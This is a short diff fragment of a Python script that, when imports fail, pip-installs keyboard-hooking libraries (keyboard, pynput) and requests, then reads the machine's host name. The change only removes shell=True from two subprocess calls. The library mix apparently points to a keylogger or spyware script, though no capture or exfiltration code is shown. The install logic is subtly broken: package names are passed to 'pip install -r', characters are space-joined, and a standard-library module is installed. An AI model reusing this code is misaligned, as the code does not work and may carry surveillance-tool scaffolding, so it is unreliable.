@@ -17,8 +17,8 @@ if sys.version_info.major >= 3:
     except ModuleNotFoundError:
         packages = ["keyboard","pynput", "json", "requests"]
         for package in packages:
-            subprocess.call("pip install -r requirements.txt", shell=True)
-            subprocess.call("pip install -r" + ' '.join(package), shell=True)
+            subprocess.call("pip install -r requirements.txt")
+            subprocess.call("pip install -r" + ' '.join(package))
 
     finally:
         USER_HOSTNAME = socket.gethostname()
